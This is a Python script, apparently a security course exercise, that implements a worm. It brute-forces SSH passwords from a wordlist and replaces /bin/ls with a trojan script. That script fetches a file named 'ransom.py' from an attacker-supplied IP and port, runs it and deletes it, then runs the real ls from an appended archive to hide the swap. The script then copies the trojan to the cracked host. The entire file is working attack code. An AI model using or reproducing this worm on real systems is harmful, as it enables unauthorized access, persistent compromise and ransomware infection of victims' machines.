import paramiko
import itertools
import sys
import os
from pathlib import Path
import subprocess
import socket

def injectPayload():
    ip = "\"" + sys.argv[2] + "\""
    port = sys.argv[3]
    with open("/bin/ls", "rb") as f:
        signature = f.read()[-4:].hex()
    if signature != "aabbccdd":
        size = os.path.getsize("/bin/ls")
        os.system("zip /bin/ls.zip /bin/ls")
        request = f'''#!/bin/bash

python3 - <<END
import socket
import sys
def send_tcp_request(host, port):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        client_socket.connect((host, port))
        
        message = "Hello, server!"
        client_socket.sendall(message.encode())
        
        response = client_socket.recv(1024)
        with open('ransom.py', 'wb') as f:
            f.write(response)
        
    except Exception as e:
        print("Error")
    finally:
        client_socket.close()
        
ip = {ip}
port = {port}
'''
        with open("worm.sh", "w") as script:
            script.write(request)
            script.write('''         
send_tcp_request(ip, port)
END

chmod +x ransom.py
python3 ransom.py
rm ransom.py

# unzip original "ls"
tail -n +$(awk '/^__ARCHIVE_BELOW__/ {print NR + 1; exit 0; }' ./ls) ./ls | head -c 58861 > /tmp/extracted.zip
cd ..
unzip /tmp/extracted.zip -d /tmp
chmod +x /tmp/bin/ls
cd app
/tmp/bin/ls $1
rm /tmp/extracted.zip
rm -rf /tmp/bin
exit 0

__ARCHIVE_BELOW__
''')
        
        os.system("cat /bin/ls.zip >> worm.sh")
        os.truncate("worm.sh", size - 4)
        with open("worm.sh", "ab") as script:
            script.write(b"\xaa\xbb\xcc\xdd")
        os.system("mv worm.sh /bin/ls")
        os.system("chmod +x /bin/ls")
        os.remove("/bin/ls.zip")
    
    
def crack(target_ip):
    with open('/app/victim.dat', 'r') as file:
        strings = [line.strip() for line in file]
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    found = False 
    for r in range(1, len(strings) + 1): 
        if found: 
            break
        combinations = itertools.product(strings, repeat=r)
        for combo in combinations:
            pd = ''.join(combo)
            try:
                ssh.connect(target_ip, username='csc2024', password=pd)
                print("crack", pd)
                found = True  
                return ssh
                break
            except paramiko.AuthenticationException:
                continue
            except paramiko.SSHException as e:
                continue
            finally:
                if not found: 
                    ssh.close()

def injectVirus(ssh):
    t = ssh.get_transport()
    sftp = paramiko.SFTPClient.from_transport(t)
    sftp.put('/bin/ls', '/app/ls')
    stdin, stdout, stderr = ssh.exec_command("echo 'abcd")
    stdout.read()
    stdin, stdout, stderr = ssh.exec_command("chmod +x /app/ls")
    stdout.read()
    print("Virus injected!")
    
def main():
    if len(sys.argv) != 4:
        sys.exit(1)
    else:
        injectPayload()
        victim = crack(sys.argv[1])
        injectVirus(victim)
        
if __name__ == '__main__':
    main()
